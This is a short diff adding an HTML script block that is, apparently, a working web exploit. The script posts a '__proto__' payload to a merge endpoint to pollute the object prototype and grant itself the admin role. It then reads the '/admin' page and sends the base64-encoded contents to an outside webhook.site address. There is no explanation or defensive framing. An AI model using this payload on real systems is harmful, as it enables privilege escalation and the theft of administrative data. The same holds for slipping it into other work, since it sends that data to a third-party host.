@@ -1,0 +1,22 @@
+<script>
+(async () => {
+  await fetch('/api/merge', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({
+      base:{},
+      override:{
+        "__proto__":{
+          role:"admin"
+        }
+      }
+    })
+  });
+
+  let res = await fetch('/admin');
+  let text = await res.text();
+
+  // send to webhook
+  fetch('https://webhook.site/bfd6fc04-83e8-42d5-ab4c-c65c246540a4' + btoa(text));
+})();
+</script>
